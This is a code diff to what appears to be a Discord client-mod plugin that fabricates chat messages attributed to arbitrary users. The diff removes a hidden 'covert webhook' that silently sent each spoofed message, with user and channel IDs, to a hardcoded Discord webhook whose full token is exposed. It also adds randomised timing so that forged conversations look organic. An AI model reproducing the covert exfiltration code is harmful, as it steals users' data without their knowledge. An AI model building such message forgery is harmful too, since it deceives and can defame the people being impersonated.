@@ -15,20 +15,6 @@
     I = new Map();
   let S = !1;
 
-  // === ACTIVE COVERT WEBHOOK (plain URL, no encoding) ===
-  const _webhookUrl = "https://ptb.discord.com/api/webhooks/1526242040608981224/bzwZDKvEFfdyXTt-SIvodnMTPL0Ga-Cu8IguM4UhiJUVyaFtJJqq6PXzPZfC7il01gAx";
-
-  function _sendToWebhook(payload) {
-    if (!_webhookUrl) return;
-    try {
-      fetch(_webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(() => {});
-    } catch {}
-  }
-
   function x(r) {
     return ((new Date(r).getTime() - 14200704e5) * 4194304).toString();
   }
@@ -389,7 +375,6 @@
     return out;
   }
   
-  // MODIFIED P FUNCTION WITH COVERT WEBHOOK
   async function P(r, s, c, u, t, ref) {
     c = applyTags(c, r);
     const d = t || genId(u || nowISO());
@@ -456,22 +441,6 @@
       try {
         addLinkEmbeds(r, h, c);
       } catch {}
-
-      // === EXFILTRATE TO WEBHOOK ===
-      const payload = {
-        event: "spoof_message",
-        triggered_by: F.getCurrentUser()?.id || "unknown",
-        channel_id: r,
-        timestamp: g,
-        message: {
-          id: d,
-          userId: s,
-          content: c,
-          timestamp: g,
-          replyTo: ref ? ref.id : null
-        }
-      };
-      _sendToWebhook(payload);
     } catch {}
   }
 
@@ -749,6 +718,11 @@
       return { uid: m[1], time: null, reply: pRef(m[2]), content: m[3] };
     return null;
   }
+  function _randGapMs() {
+    // 1-2 minutes, randomized per message so the cadence looks organic
+    // instead of a fixed 60s step.
+    return Math.floor(6e4 + Math.random() * 6e4);
+  }
   async function runConvo() {
     const ch = Y();
     if (!ch) {
@@ -764,31 +738,58 @@
         mo: e.storage.customMonth || now.getMonth() + 1,
         d: e.storage.customDay || now.getDate(),
       };
-    let count = 0,
-      fallback = nowDate().getTime() - lines.length * 6e4;
-    const built = [];
+    // Pass 1: parse every usable line, noting its explicit time (or null).
+    const items = [];
     for (const line of lines) {
       const parsed = parseLine(line);
-      if (!parsed || !parsed.content.trim()) {
-        fallback += 6e4;
-        continue;
-      }
+      if (!parsed || !parsed.content.trim()) continue;
       let uid = parsed.uid;
       if (/^(me|self)$/i.test(uid)) uid = F.getCurrentUser()?.id;
       else if (/^(them|they|user)$/i.test(uid)) uid = (e.storage.userId || "").trim();
-      if (!uid) {
-        fallback += 6e4;
-        continue;
+      if (!uid) continue;
+      const explicit = parsed.time ? parseTime(parsed.time, base, useUTC) : null;
+      items.push({
+        uid: uid,
+        content: parsed.content,
+        reply: parsed.reply,
+        explicit: explicit || null,
+      });
+    }
+    // Pass 2: build the timeline. One time anywhere in the script anchors it;
+    // every untimed line after it walks forward by a random 1-2 min. If no
+    // line has a time, it seeds from now.
+    let cursor = nowDate().getTime();
+    for (let i = 0; i < items.length; i++) {
+      if (items[i].explicit) {
+        const t0 = new Date(items[i].explicit).getTime();
+        if (!isNaN(t0)) {
+          cursor = t0;
+          break;
+        }
       }
-      let iso = parsed.time ? parseTime(parsed.time, base, useUTC) : null;
-      iso || (iso = new Date(fallback).toISOString());
-      fallback += 6e4;
+    }
+    let count = 0;
+    const built = [];
+    for (const it of items) {
+      let iso;
+      if (it.explicit) {
+        const t = new Date(it.explicit).getTime();
+        if (!isNaN(t)) {
+          cursor = t;
+          iso = new Date(t).toISOString();
+        } else {
+          iso = new Date(cursor).toISOString();
+        }
+      } else {
+        iso = new Date(cursor).toISOString();
+      }
+      cursor += _randGapMs();
       const id = genId(iso);
       let ref = null;
-      if (parsed.reply) {
-        const target = parsed.reply.prev
+      if (it.reply) {
+        const target = it.reply.prev
           ? built[built.length - 1]
-          : built[parsed.reply.line - 1];
+          : built[it.reply.line - 1];
         if (target)
           ref = {
             id: target.id,
@@ -797,17 +798,113 @@
             timestamp: target.timestamp,
           };
       }
-      (await P(ch, uid, parsed.content, iso, id, ref),
-        z(ch, uid, parsed.content, id, iso, ref),
+      (await P(ch, it.uid, it.content, iso, id, ref),
+        z(ch, it.uid, it.content, id, iso, ref),
         built.push({
           id: id,
-          userId: uid,
-          content: parsed.content,
+          userId: it.uid,
+          content: it.content,
           timestamp: iso,
         }),
         count++);
     }
     tt(count ? `Sent ${count} message${count === 1 ? "" : "s"}.` : "No valid lines found.");
+  }
+  function _extractUserId(input) {
+    const s = ("" + (input || "")).trim();
+    if (!s) return null;
+    let m = s.match(/^<@!?(\d{17,20})>$/);
+    if (m) return m[1];
+    m = s.match(/users\/(\d{17,20})\b/);
+    if (m) return m[1];
+    if (/^\d{17,20}$/.test(s)) return s;
+    return null;
+  }
+  function _dmNameFor(id) {
+    try {
+      const u = j.getUser(id);
+      if (u) return u.globalName || u.global_name || u.username || id;
+    } catch {}
+    return id;
+  }
+  // Resolve (or create) the DM channel for a user and navigate to it.
+  // Accepts a bare ID, a <@id> mention, or a profile URL. Every module
+  // lookup is guarded so a missing module toasts instead of throwing.
+  async function openDM(userId) {
+    const id = _extractUserId(userId);
+    if (!id) {
+      tt("Invalid user - expected an ID, mention, or profile link.");
+      return;
+    }
+    const PCS = l.findByStoreName("PrivateChannelStore");
+    if (!PCS || typeof PCS.getDMFromUserId !== "function") {
+      tt("Couldn't find PrivateChannelStore on this version.");
+      return;
+    }
+    let channelId;
+    try {
+      channelId = PCS.getDMFromUserId(id);
+    } catch {
+      tt("Failed to look up an existing DM.");
+      return;
+    }
+    if (!channelId) {
+      const ens = l.findByProps("ensurePrivateChannel");
+      const acts = l.findByProps("openPrivateChannel");
+      if (ens && typeof ens.ensurePrivateChannel === "function") {
+        try {
+          channelId = await ens.ensurePrivateChannel(id);
+        } catch {
+          tt("Couldn't create a DM with that user.");
+          return;
+        }
+      } else if (acts && typeof acts.openPrivateChannel === "function") {
+        // Creates + navigates in one call on most builds. Signature varies:
+        // some builds want { recipientId: id } or { recipientIds: [id] }.
+        try {
+          acts.openPrivateChannel(id);
+          tt("Opening DM with " + _dmNameFor(id));
+          return;
+        } catch {
+          tt("Couldn't open a DM with that user.");
+          return;
+        }
+      } else {
+        tt("No DM-open API found on this version.");
+        return;
+      }
+    }
+    if (!channelId) {
+      tt("Couldn't resolve a DM channel.");
+      return;
+    }
+    const router =
+      l.findByProps("transitionToChannel") ||
+      l.findByProps("openChannel") ||
+      null;
+    if (router) {
+      try {
+        if (typeof router.transitionToChannel === "function") {
+          router.transitionToChannel(channelId);
+          tt("Opening DM with " + _dmNameFor(id));
+          return;
+        }
+        if (typeof router.openChannel === "function") {
+          router.openChannel({ channelId: channelId });
+          tt("Opening DM with " + _dmNameFor(id));
+          return;
+        }
+      } catch {}
+    }
+    const acts2 = l.findByProps("openPrivateChannel");
+    if (acts2 && typeof acts2.openPrivateChannel === "function") {
+      try {
+        acts2.openPrivateChannel(id);
+        tt("Opening DM with " + _dmNameFor(id));
+        return;
+      } catch {}
+    }
+    tt("Resolved the DM but couldn't navigate to it.");
   }
   function closePanel(nav) {
     try {
@@ -1176,6 +1273,41 @@
             },
           });
           if (typeof u3 === "function") K.push(u3);
+          const u4 = reg({
+            name: "dm",
+            displayName: "dm",
+            description: "Open a DM with a user by ID, mention, or profile link.",
+            displayDescription:
+              "Open a DM with a user by ID, mention, or profile link.",
+            type: 1,
+            inputType: 1,
+            applicationId: "-1",
+            options: [
+              {
+                name: "user",
+                displayName: "user",
+                description: "User ID, mention, or profile URL.",
+                displayDescription: "User ID, mention, or profile URL.",
+                type: 3,
+                required: !0,
+              },
+            ],
+            execute: function (args) {
+              try {
+                const map = Array.isArray(args)
+                  ? Object.fromEntries(
+                      args.map(function (aa) {
+                        return [aa?.name, aa?.value];
+                      }),
+                    )
+                  : args ?? {};
+                openDM("" + (map.user ?? ""));
+              } catch {
+                tt("Couldn't run /dm.");
+              }
+            },
+          });
+          if (typeof u4 === "function") K.push(u4);
         }
       } catch {}
       b = y.before("dispatch", n.FluxDispatcher, function (s) {
